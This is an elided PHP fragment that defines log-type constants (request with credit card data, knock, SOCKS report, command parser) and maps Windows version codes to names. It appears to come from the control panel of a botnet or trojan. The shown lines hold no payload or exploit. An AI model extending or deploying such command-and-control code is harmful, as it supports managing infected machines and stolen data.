...
define('BLT_REQUEST_WITH_CC', 13);
define('BLT_KNOCK', 31);
define('BLT_SOCKS_REPORT', 33);
define('BLT_CMDPARSER', 50);
...
{
  $name = 'Unknown';
  if(strlen($os_data) == 6 /*sizeof(OSINFO)*/ || strlen($os_data) == 8)
  {
    ...
    switch($data['version'])
    {
	  ...
	  case 8: $name = 'Server 2012'; break;
	  case 9: $name = 'Eight'; break;
    }
